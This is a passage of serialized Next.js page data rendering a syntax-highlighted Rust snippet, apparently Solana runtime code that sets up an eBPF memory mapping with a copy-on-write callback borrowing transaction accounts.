token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Cow\"]}]\n38d:[\"$\",\"span\",\"code-segment-114\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n38e:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n38f:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n390:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"token to"])</script><script>self.__next_f.push([1,"ken\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n391:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"   \"]}]\n392:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// The memory region is writable but must be copied before writing\"]}]\n393:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n394:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\n395:[\"$\",\"span\",\"code-segment-122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n396:[\"$\",\"span\",\"code-segment-123\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n397:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n398:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'b\"]}]\n399:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\n39a:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n39b:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n39c:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Box\"]}]\n39d:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n39e:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"dyn\"]}]\n39f:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n3a0:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"std\"]}]\n3a1:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"token token\",\"st"])</script><script>self.__next_f.push([1,"yle\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n3a2:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"error\"]}]\n3a3:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n3a4:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}]\n3a5:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\n3a6:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n3a7:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n3a8:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3a9:[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}]\n3aa:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n3ab:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n3ac:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" stack_size \"]}]\n3ad:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n3ae:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" stack\"]}]\n3af:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n3b0:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"len\"]}]\n3b1:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n3b2:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n3b3:[\"$\",\"span\",\"code-segment-57\",{\"c"])</script><script>self.__next_f.push([1,"lassName\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n3b4:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3b5:[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}]\n3b6:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n3b7:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n3b8:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" heap_size \"]}]\n3b9:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n3ba:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" heap\"]}]\n3bb:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n3bc:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"len\"]}]\n3bd:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n3be:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n3bf:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n3c0:[\"$\",\"span\",\"code-segment-70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3c1:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n3c2:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n3c3:[\"$\",\"span\",\"code-segment-73\",{\"className\""])</script><script>self.__next_f.push([1,":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n3c4:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts \"]}]\n3c5:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n3c6:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n3c7:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Arc\"]}]\n3c8:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n3c9:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}]\n3ca:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n3cb:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"invoke_context\"]}]\n3cc:[\"$\",\"span\",\"code-segment-82\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n3cd:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"transaction_context\"]}]\n3ce:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n3cf:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"accounts\"]}]\n3d0:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n3d1:[\"$\",\"span\",\"code-segment-87\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n3d2:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n3d3:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n3d4:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3d5:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"no"])</script><script>self.__next_f.push([1,"ne\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n3d6:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n3d7:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n3d8:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" memory_mapping \"]}]\n3d9:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n3da:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n3db:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"create_memory_mapping\"]}]\n3dc:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n3dd:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3de:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n3df:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n3e0:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n3e1:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3e2:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n3e3:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        regions\"]}]\n3e4:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"}"])</script><script>self.__next_f.push([1,",\"children\":[\",\"]}]\n3e5:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3e6:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n3e7:[\"$\",\"span\",\"code-segment-109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n3e8:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// this is the cow_cb\"]}]\n3e9:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3ea:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n3eb:[\"$\",\"span\",\"code-segment-113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n3ec:[\"$\",\"span\",\"code-segment-114\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}]\n3ed:[\"$\",\"span\",\"code-segment-115\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n3ee:[\"$\",\"span\",\"code-segment-116\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Box\"]}]\n3ef:[\"$\",\"span\",\"code-segment-117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n3f0:[\"$\",\"span\",\"code-segment-118\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new\"]}]\n3f1:[\"$\",\"span\",\"code-segment-119\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n3f2:[\"$\",\"span\",\"code-segment-120\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"move\"]}]\n3f3:[\"$\",\"span\",\"code-segment-121\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n3f4:[\"$\",\"span\",\"code-segment-122\",{\"class"])</script><script>self.__next_f.push([1,"Name\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}]\n3f5:[\"$\",\"span\",\"code-segment-123\",{\"className\":\"token token closure-params\",\"style\":{},\"children\":[\"index_in_transaction\"]}]\n3f6:[\"$\",\"span\",\"code-segment-124\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}]\n3f7:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n3f8:[\"$\",\"span\",\"code-segment-126\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n3f9:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3fa:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n3fb:[\"$\",\"span\",\"code-segment-129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n3fc:[\"$\",\"span\",\"code-segment-130\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// The two calls below can't really fail. If they fail because of a bug,\"]}]\n3fd:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n3fe:[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[11]}]\n3ff:[\"$\",\"span\",\"code-segment-133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n400:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// whatever is writing will trigger an EbpfError::AccessViolation like\"]}]\n401:[\"$\",\"span\",\"code-segment-135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n402:[\"$\",\"span\",\"line-num"])</script><script>self.__next_f.push([1,"ber--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[12]}]\n403:[\"$\",\"span\",\"code-segment-137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n404:[\"$\",\"span\",\"code-segment-138\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// if the region was readonly, and the transaction will fail gracefully.\"]}]\n405:[\"$\",\"span\",\"code-segment-139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n406:[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[13]}]\n407:[\"$\",\"span\",\"code-segment-141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}]\n408:[\"$\",\"span\",\"code-segment-142\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n409:[\"$\",\"span\",\"code-segment-143\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n40a:[\"$\",\"span\",\"code-segment-144\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n40b:[\"$\",\"span\",\"code-segment-145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" account \"]}]\n40c:[\"$\",\"span\",\"code-segment-146\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n40d:[\"$\",\"span\",\"code-segment-147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\\n\"]}]\n40e:[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[14]}]\n40f:[\"$\",\"span\",\"code-segment-149\",{"])</script><script>self.__next_f.push([1,"\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n410:[\"$\",\"span\",\"code-segment-150\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n411:[\"$\",\"span\",\"code-segment-151\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"try_borrow_mut\"]}]\n412:[\"$\",\"span\",\"code-segment-152\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n413:[\"$\",\"span\",\"code-segment-153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index_in_transaction \"]}]\n414:[\"$\",\"span\",\"code-segment-154\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n415:[\"$\",\"span\",\"code-segment-155\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n416:[\"$\",\"span\",\"code-segment-156\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"IndexOfAccount\"]}]\n417:[\"$\",\"span\",\"code-segment-157\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n418:[\"$\",\"span\",\"code-segment-158\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n419:[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[15]}]\n41a:[\"$\",\"span\",\"code-segment-160\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n41b:[\"$\",\"span\",\"code-segment-161\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n41c:[\"$\",\"span\",\"code-segment-162\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"map_err\"]}]\n41d:[\"$\",\"span\",\"code-segment-163\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n41e:[\"$\",\"span\",\"code-segment-164\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}]\n41f:[\"$\",\"span\",\"code-segment-165\",{\"className\":\"token token closure-params\",\"style\":{},\"children\":[\"_\"]}]\n420:[\"$\",\"span\",\""])</script><script>self.__next_f.push([1,"code-segment-166\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}]\n421:[\"$\",\"span\",\"code-segment-167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n422:[\"$\",\"span\",\"code-segment-168\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n423:[\"$\",\"span\",\"code-segment-169\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n424:[\"$\",\"span\",\"code-segment-170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n425:[\"$\",\"span\",\"code-segment-171\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\n426:[\"$\",\"span\",\"code-segment-172\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n427:[\"$\",\"span\",\"code-segment-173\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n428:[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\n429:[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[17]}]\n42a:[\"$\",\"span\",\"code-segment-177\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n42b:[\"$\",\"span\",\"code-segment-178\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n42c:[\"$\",\"span\",\"code-segment-179\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"touch\"]}]\n42d:[\"$\",\"span\",\"code-segment-180\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n42e:[\"$\",\"span\",\"code-segment-181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index_in_transaction \"]}]\n42f:[\"$\",\"span\",\"code-segment-182\",{\"c"])</script><script>self.__next_f.push([1,"lassName\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n430:[\"$\",\"span\",\"code-segment-183\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n431:[\"$\",\"span\",\"code-segment-184\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"IndexOfAccount\"]}]\n432:[\"$\",\"span\",\"code-segment-185\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n433:[\"$\",\"span\",\"code-segment-186\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n434:[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[18]}]\n435:[\"$\",\"span\",\"code-segment-188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}]\n436:[\"$\",\"span\",\"code-segment-189\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n437:[\"$\",\"span\",\"code-segment-190\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"map_err\"]}]\n438:[\"$\",\"span\",\"code-segment-191\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n439:[\"$\",\"span\",\"code-segment-192\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}]\n43a:[\"$\",\"span\",\"code-segment-193\",{\"className\":\"token token closure-params\",\"style\":{},\"children\":[\"_\"]}]\n43b:[\"$\",\"span\",\"code-segment-194\",{\"className\":\"token token closure-params closure-punctuation\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"|\"]}]\n43c:[\"$\",\"span\",\"code-segment-195\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n43d:[\"$\",\"span\",\"code-segment-196\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n43e:[\"$\",\"span\",\"code-segment-197\",{\"className\":\"token 